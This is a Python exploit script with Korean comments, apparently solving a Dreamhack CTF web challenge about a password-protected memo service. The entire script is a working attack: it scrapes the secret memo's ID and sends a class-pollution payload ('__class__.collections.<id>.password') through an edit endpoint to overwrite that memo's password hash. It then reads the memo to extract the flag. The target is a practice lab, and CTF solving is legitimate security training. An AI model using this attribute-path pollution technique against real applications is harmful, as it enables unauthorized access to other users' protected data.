import requests
import re
import hashlib

# 타겟 서버 주소 설정
TARGET_URL = "http://host8.dreamhack.games:15348"

def print_debug(stage, info):
    """디버깅이 편하도록 과정과 결과를 상세히 출력하는 헬퍼 함수"""
    print(f"[*] {stage}")
    print(f"    -> {info}\n")

def solve():
    print_debug("시작", f"타겟 URL: {TARGET_URL} 로 익스플로잇을 시작합니다.")
    
    session = requests.Session()
    
    # [단계 1] 인덱스 페이지에서 시크릿 메모의 UUID 가져오기
    print_debug("1단계", "인덱스 페이지(/)에 접속하여 메모 목록을 가져옵니다.")
    res = session.get(TARGET_URL + "/")
    print_debug("1단계 디버그", f"응답 상태 코드: {res.status_code}")
    
    # HTML에서 시크릿 메모의 ID 추출 (예: <a href="/view/UUID">Title: secret</a>)
    secret_matches = re.findall(r'href="/view/([a-f0-9\-]+)">Title:\s*secret', res.text)
    if not secret_matches:
        print_debug("❌ 오류", "시크릿 메모의 ID를 찾을 수 없습니다. 서버 상태나 HTML 응답을 확인하세요.")
        return
        
    secret_id = secret_matches[0]
    print_debug("1단계 결과", f"시크릿 메모 ID 획득 완료: {secret_id}")
    
    # [단계 2] 공격을 수행할 내 메모 생성하기
    my_password = "hack"
    my_password_hash = hashlib.sha256(my_password.encode()).hexdigest()
    
    print_debug("2단계", f"페이로드를 쏠 새로운 메모를 생성합니다.\n    -> 설정할 비밀번호: {my_password}\n    -> 예상 SHA256 해시: {my_password_hash}")
    res = session.post(TARGET_URL + "/new", data={
        "title": "my_memo",
        "content": "my_content",
        "password": my_password
    })
    print_debug("2단계 디버그", f"새 메모 생성 요청 응답 상태 코드: {res.status_code}")
    
    # 방금 생성한 내 메모의 ID 가져오기
    res = session.get(TARGET_URL + "/")
    my_matches = re.findall(r'href="/view/([a-f0-9\-]+)">Title:\s*my_memo', res.text)
    if not my_matches:
        print_debug("❌ 오류", "생성된 내 메모의 ID를 찾을 수 없습니다.")
        return
        
    my_id = my_matches[0]
    print_debug("2단계 결과", f"내 메모 ID 획득 완료: {my_id}")
    
    # [단계 3] Class Pollution 공격으로 시크릿 메모 비밀번호 변조
    payload_option = f"__class__.collections.{secret_id}.password"
    print_debug("3단계", f"Class Pollution 공격을 수행합니다.\n    -> 타겟 경로(selected_option): {payload_option}\n    -> 덮어쓸 데이터(edit_data): {my_password_hash}")
    
    res = session.post(f"{TARGET_URL}/edit/{my_id}", data={
        "password": my_password,
        "selected_option": payload_option,
        "edit_data": my_password_hash
    })
    print_debug("3단계 디버그", f"페이로드 전송 응답 상태 코드: {res.status_code}")
    print_debug("3단계 결과", "서버의 set_attr 함수가 동작하여 시크릿 메모의 비밀번호 해시가 우리가 설정한 해시로 덮어씌워졌을 것입니다.")
    
    # [단계 4] 변조한 비밀번호로 시크릿 메모 읽기
    print_debug("4단계", f"덮어씌운 비밀번호 '{my_password}' 로 시크릿 메모 열람을 시도합니다.")
    res = session.post(f"{TARGET_URL}/view/{secret_id}", data={
        "password": my_password
    })
    print_debug("4단계 디버그", f"시크릿 메모 열람 응답 상태 코드: {res.status_code}")
    
    # 플래그 출력
    print_debug("최종 확인", "시크릿 메모 내용에서 플래그(DH{...}) 추출 시도 중...")
    flag_matches = re.findall(r'DH{[^}]+}', res.text)
    
    if flag_matches:
        print("\n" + "="*50)
        print(f"🎉 FLAG FOUND: {flag_matches[0]}")
        print("="*50 + "\n")
    else:
        print_debug("❌ 실패", "플래그를 찾지 못했습니다. 열람된 HTML 응답 원본을 출력합니다.")
        print("-" * 30)
        print(res.text)

if __name__ == "__main__":
    solve()